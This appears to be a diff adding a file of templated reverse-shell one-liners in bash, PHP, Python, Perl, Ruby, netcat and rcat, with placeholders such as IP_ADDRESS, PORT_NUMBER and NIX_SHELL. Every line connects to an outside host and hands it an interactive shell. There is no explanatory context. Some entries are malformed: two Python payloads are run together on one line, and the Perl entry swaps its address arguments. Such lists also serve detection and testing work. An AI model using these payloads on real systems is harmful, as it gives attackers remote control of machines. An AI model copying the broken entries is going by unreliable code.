@@ -1,0 +1,21 @@
+NIX_SHELL -i >& /dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER 0>&1
+php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);shell_exec("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER");'
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP_ADDRESS",PORT_NUMBER));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("NIX_SHELL")'
+php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);exec("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER");'
+ruby -rsocket -e'exit if fork;c=TCPSocket.new("IP_ADDRESS","PORT_NUMBER");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
+0<&FD_NUMBER;exec FD_NUMBER<>/dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER; NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER
+ruby -rsocket -e'spawn("NIX_SHELL",[:in,:out,:err]=>TCPSocket.new("IP_ADDRESS","PORT_NUMBER"))'
+php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);system("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER");'
+perl -e 'use Socket;$VARIABLE_NAME_1="IP_ADDRESS";$VARIABLE_NAME_2=PORT_NUMBER;socket(S,PF_INET,SOCK_STREAM,getprotobyname("PROTOCOL_TYPE"));if(connect(S,sockaddr_in($VARIABLE_NAME_1,inet_aton($VARIABLE_NAME_2)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("NIX_SHELL -i");};'
+php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);passthru("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER");'
+export VARIABLE_NAME_1="IP_ADDRESS";export VARIABLE_NAME_2=PORT_NUMBER;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("VARIABLE_NAME_1"),int(os.getenv("VARIABLE_NAME_2"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("NIX_SHELL")'python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("NIX_SHELL")'
+nc -eu NIX_SHELL IP_ADDRESS PORT_NUMBER
+rcat IP_ADDRESS PORT_NUMBER -r NIX_SHELL
+export VARIABLE_NAME_1="IP_ADDRESS";export VARIABLE_NAME_2=PORT_NUMBER;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("VARIABLE_NAME_1"),int(os.getenv("VARIABLE_NAME_2"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("NIX_SHELL")'
+NIX_SHELL -i FD_NUMBER<> /dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER 0<&FD_NUMBER 1>&FD_NUMBER 2>&FD_NUMBER
+ruby -rsocket -e'exit if fork;c=TCPSocket.new("IP_ADDRESS",PORT_NUMBER);loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
+nc -c NIX_SHELL IP_ADDRESS PORT_NUMBER
+php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);`NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER`;'
+php -r '$VARIABLE_NAME_1=fsockopen("IP_ADDRESS",PORT_NUMBER);$VARIABLE_NAME_2=proc_open("NIX_SHELL", array(0=>$VARIABLE_NAME_1, 1=>$VARIABLE_NAME_1, 2=>$VARIABLE_NAME_1),$VARIABLE_NAME_2);'
+nc -e NIX_SHELL IP_ADDRESS PORT_NUMBER
+nc -cu NIX_SHELL IP_ADDRESS PORT_NUMBER
